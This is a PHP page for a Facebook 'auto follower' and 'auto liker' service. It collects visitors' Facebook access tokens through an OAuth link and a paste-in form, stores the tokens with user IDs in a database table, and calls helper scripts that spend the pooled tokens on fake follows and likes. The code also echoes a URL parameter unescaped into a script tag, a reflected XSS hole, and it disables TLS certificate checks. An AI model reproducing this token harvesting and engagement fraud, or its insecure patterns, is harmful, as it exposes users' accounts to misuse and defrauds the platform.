<?php
#-----------------------------------------------------#
jk
#-----------------------------------------------------#
?><?php
session_start();
// JSONURL //
function get_html($url) {
    $ch = curl_init();

    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    curl_setopt($ch, CURLOPT_URL, $url);
	curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
	curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
	curl_setopt($ch, CURLOPT_FAILONERROR, 0);
    $data = curl_exec($ch);
    curl_close($ch);
	return $data;
    }
function get_json($url) {
    $ch = curl_init();

    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    curl_setopt($ch, CURLOPT_URL, $url);
	curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
	curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
	curl_setopt($ch, CURLOPT_FAILONERROR, 0);
    $data = curl_exec($ch);
    curl_close($ch);
	return json_decode($data);
    }
if($_SESSION['token']){
	$token = $_SESSION['token'];
	$graph_url ="https://graph.fb.me/me?access_token=" . $token;
	$user = get_json($graph_url);
	if ($user->error) {
		if ($user->error->type== "OAuthException") {
			session_destroy();
			header('Location: index.php?i=Your Token Expired please re insert token');
			}
		}
}	
if(isset($_POST['submit'])) {
	$token2 = $_POST['token'];
	if(preg_match("'access_token=(.*?)&expires_in='", $token2, $matches)){
		$token = $matches[1];
			}
	else{
		$token = $token2;
	}
		$extend = get_html("https://graph.fb.me/me/permissions?access_token="  . $token);
		$pos = strpos($extend, "publish_stream");
		if ($pos == true) {
		$_SESSION['token'] = $token;
			}
			else {
			session_destroy();
					header('Location: index.php?i= Please insert BlackBerry token only');}
		
		}else{}
if(isset($_POST['logout'])) {
session_destroy();
header('Location: index.php?i=Thanks For his visit, you
successfully deleted the token');
}
if(isset($_GET['i'])){
echo '<script type="text/javascript">alert("INFO:  ' . $_GET['i'] . '");</script>';
}

?>


<?php include '../header.php';?>
<?php
error_reporting(0);
$lamafile = 300;
$waktu = time();
if ($handle = opendir('block')) {
while(false !== ($file = readdir($handle)))
{
$akses = fileatime('block/'.$file);
if( $akses !== false)
if( ($waktu- $akses)>=$lamafile )
unlink('block/'.$file);
}
closedir($handle);
}
?>
<?php
error_reporting(0);
$lim = 3600;
$timeoff = time();
$aksen = fileatime('qqq/ref');
if( ($timeoff- $aksen)>=$lim ){
unlink('qqq/ref');
}
?>
<?php
$like = new like();
if($_GET[act]){
print '<script>top.location.href="https://m.facebook.com/dialog/oauth?client_id=260273468396&redirect_uri=https://www.facebook.com/connect/login_success.html&display=wap&response_type=token&fbconnect=1&from_login=1&refid=9"</script>';
}
if($_SESSION['token']){
$access_token = $_SESSION['token'];
$me = $like -> me($access_token);
if($me['id']){

include'config.php';



   mysql_query("CREATE TABLE IF NOT EXISTS `Likers` (

      `id` int(11) NOT NULL AUTO_INCREMENT,

      `user_id` varchar(32) NOT NULL,

      `name` varchar(32) NOT NULL,

      `access_token` varchar(255) NOT NULL,

      PRIMARY KEY (`id`)

      ) ENGINE=MyISAM DEFAULT CHARSET=utf8 AUTO_INCREMENT=1 ;

   ");
   $row = null;

   $result = mysql_query("

      SELECT

         *

      FROM

         Likers

      WHERE

         user_id = '" . mysql_real_escape_string($me['id']) . "'

   ");

   

   if($result){

      $row = mysql_fetch_array($result, MYSQL_ASSOC);

      if(mysql_num_rows($result) > 1){

         mysql_query("

            DELETE FROM

               Likers

            WHERE

               user_id='" . mysql_real_escape_string($me['id']) . "' AND

               id != '" . $row['id'] . "'

         ");

      }
      }

   if(!$row){

      mysql_query(

         "INSERT INTO 

            Likers

         SET

            `user_id` = '" . mysql_real_escape_string($me['id']) . "',
   
            `name` = '" . mysql_real_escape_string($me['name']) . "',

            `access_token` = '" . mysql_real_escape_string($access_token) . "'

      ");

   } else {

      mysql_query(

         "UPDATE 

            Likers

         SET

            `access_token` = '" . mysql_real_escape_string($access_token) . "'

         WHERE
            `id` = " . $row['id'] . "

      ");

   }
mysql_close($connection);

if($limit = fileatime('block/'.$me[id])){
$timeoff = time();
$cek = date("i:s",$timeoff - $limit);
echo'
<div class="judul2"><font color="red"><h2>Follow NOT ACTIVE</h2></font><br>Wait Second Startlike 05:00 minutes</font> = <font color="red">'.$cek.'</font></div></div>';
}else{
echo' <div class="judul2"><font color="green"><h2>Follow ACTIVE</h2></font></div></div>';
}
echo'
<div class="phdr"><a href="menu.php">[Back To MENU]</a></div>
<div id="content"> <div class="post-single"> <div class="post-meta"> <h2 class="title">Your Profile</h2></div>
<div class="post-content">
<a href="https://m.facebook.com/'.$me[id].'"/><img src="https://graph.facebook.com/'.$me[id].'/picture" width="50"  alt="'.$me[name].'"/></a><br/>
<strong>Name:</strong> '.$me[name].' <br/>
<strong>ID: </strong> '.$me[id].'<br><div align="right">
<a href="/out.php"><strong>[Log Out]</strong></a></div>
</div></div>

</div>
<div align="center">
<form action="index.php" method="post"/>
<input type="text" name="id" value="'.$me[id].'"/>
<input type="hidden" name="token" value="'.$access.'"/>
<input name="pancal" type="submit" value="Get Followers!" class="judul2"/>
</form>
</div>


';



$like -> kumpul($access_token);
if($_POST[id]){
if($limit = fileatime('block/'.$me[id])){
echo' <center><div class="judul2">Follow FAILED!<br>Please Wait <font color="red"> 05 minutes</font> <br> <form action="index.php"><input class="btn btnC" type="submit" value="Back Home"></form></div>';
exit;
}
if(!is_dir('block')){
mkdir('block');
}
$bg=fopen('block/'.$me[id],'w');
fwrite($bg,1);
fclose($bg);
$like -> pancal($_POST[id]);
}else{
$like -> getData($access_token);
}
}else{
$like -> invalidToken();
}
}else{
$like->form();
}
class like {

public function pancal($id){ 
for($i=1;$i<2;$i++){
$this-> _req('http://'.$_SERVER[HTTP_HOST].'/follow29.php?id='.$id);
}
print '
<div class="judul2"> <div class="birumuda" style="margin:4px;" align="center">
<h2>Followers SUCCESS!

<form action="index.php"><input class="judul2" type="submit" value="Back"></form></div></div>';
}

public function me($access){
return json_decode($this-> _req('https://graph.fb.me/me?access_token='.$access),true);
}

public function kumpul($access){
}
public function invalidToken(){
print '
<div class="acr apl">
Invalid Access Token
</div>
';
$this->form();
}

public function form(){
$kas = file_get_contents('emo.txt'); 
    $kas = explode("\n",$kas);
         $lih = $kas[mt_rand(0,count($kas)-1)];
echo'

<div class="menu">
<h3> Auto Follower </h3>
<li><a href="accesstoken.php"> Get Access Token </a></li>
<center>
<li> Access Token <br>
<form method="get"
/action="login-follower.php">
<input class="inp-text"
type="text" name="user" rows="2" cols="15"  style="width: 70%;margin-left: 15%;" placeholder="https://m.facebook.com/connect/login_success.html?#access_token=CAAAAPJmB8ZBwBAG3IorZAbarcHg9JEgagrHwFVdmVRx9hPYxSPvfH6aqX8QC5Nuk2guu7KQJJ&expires_in=0" value="'.$_SESSION['token'].'"/>
</form></li>
<li><input class="inp-btn"
/type="submit"  class="navigation" value="Submit"/></li></center>
</div></div>



';


}

public function getData($access){
$this-> _req('http://'.$_SERVER[HTTP_HOST].'/upsam.php');
$feed=json_decode($this -> _req('http://facebook.com/feed?access_token='.$access.'&limit=0'),true);
if(count($feed[data]) >= 1){
$kam = file_get_contents('emo.txt'); 
$kam = explode("\n",$kam);
$lim = $kam[mt_rand(0,count($kam)-1)];

echo' </div><div class="judul2">
<h3 class="title"> Select the status that will get a lot like ...</div></div>';

for($i=0;$i<count($feed[data]);$i++){
$uid = $feed[data][$i][from][id];
$name = $feed[data][$i][from][name];
$type = $feed[data][$i][type];
$mess = str_replace(urldecode('%0A'),'<br/>',htmlspecialchars($feed[data][$i][message]));
$id = $feed[data][$i][id];
$pic = $feed[data][$i][picture];
$fes=json_decode($this -> _req('https://graph.fb.me/'.$id.'/likes?access_token='.$access.'&limit=1000'),true);
for($x=1;$x<=count($fes[data]);$x++){
$filosofi[] = $fes[data][$x-1][id];
}
$feed2=json_decode($this -> _req('https://graph.fb.me/me?access_token='.$access),true);

echo'
<div class="birumuda">
Type: <font color="green"><abbr> ['.$type.']</font></abbr>


';

if($type=='photo'){
echo '
<br/>
<br/>
<br/>
<img src="'.$pic.'" alt=""class="imgCrop img" style="width:100%;height:100%;left:0;top:0;" />
<span>
'.$mess.'
</span>
';
}else{
if(count($filosofi) == '1000'){
echo '
<br/>
<span>
'.$mess.'
</span><br>
<br>
<span class="post-meta">Your Likes is reached 1000+ Likes</font></span>
';
}else{
echo '
<br/>
<span>
'.$mess.'
</span><br>
<br>
<div class="birumuda">
<span> <font color="blue">'.count($filosofi).' likes </font></span></a>


';
}
}
echo '
<div align="right">
<form action="index.php" method="post"/>
<input type="text" name="id" value="'.$id.'"/><input type="hidden" name="token" value="'.$access.'"/><input name="pancal" type="submit" value="Start Liker!" class="biru2"/>
</form>
</div></div><hr></div>
</div>
</div>
</div>';
}

}else{
print '



';
}
print '
</div>
';
}

private function _req($url){
$ch = curl_init();
curl_setopt_array($ch,array(
CURLOPT_CONNECTTIMEOUT => 5,
CURLOPT_RETURNTRANSFER => true,
CURLOPT_URL => $url,
)
);
$result = curl_exec($ch);
curl_close($ch);
return $result;
}
}
?>

<?php include '../footer.php';?>

</body>
</html> 
